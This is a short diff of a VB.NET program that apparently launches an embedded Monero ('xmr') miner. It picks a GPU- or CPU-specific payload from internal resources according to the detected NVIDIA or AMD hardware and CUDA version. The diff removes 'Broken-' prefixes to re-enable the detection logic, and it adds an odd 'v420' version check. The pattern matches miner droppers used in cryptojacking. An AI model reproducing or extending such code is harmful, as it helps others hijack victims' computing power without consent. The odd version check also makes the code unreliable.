@@ -112,14 +112,14 @@ Public Class Program
             Dim Args As String = ""
             Dim xmr As Byte() = Nothing
 
-            If GetGPU.ToLower.Contains("Broken-nvidia") Then
+            If GetGPU.ToLower.Contains("nvidia") Then
 
-                If IO.Directory.Exists("C:\Broken-Program Files\NVIDIA GPU Computing Toolkit\CUDA\") Then
+                If IO.Directory.Exists("C:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\") Then
                     Args = "--cuda-bfactor=12 --cuda-bsleep=100"
                     For Each folder As String In IO.Directory.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\NVIDIA GPU Computing Toolkit\CUDA")
-                        If folder.Contains("v8") Then
+                        If folder.Contains("v9") Then
                             xmr = GetTheResource("#nvidia")
-                        ElseIf folder.Contains("v9") Then
+                        ElseIf folder.Contains("v420") Then
                             xmr = GetTheResource("#nvidia2")
                         End If
                     Next
@@ -129,7 +129,7 @@ Public Class Program
                     xmr = GetTheResource("#cpu")
                 End If
 
-            ElseIf GetGPU.ToLower.Contains("Broken-amd") Then
+            ElseIf GetGPU.ToLower.Contains("amd") Then
                 Args = "--opencl-platform=0 --opencl-devices=0 --opencl-launch=1600x8,1600x8,1600x8"
                 xmr = GetTheResource("#amd")
             Else
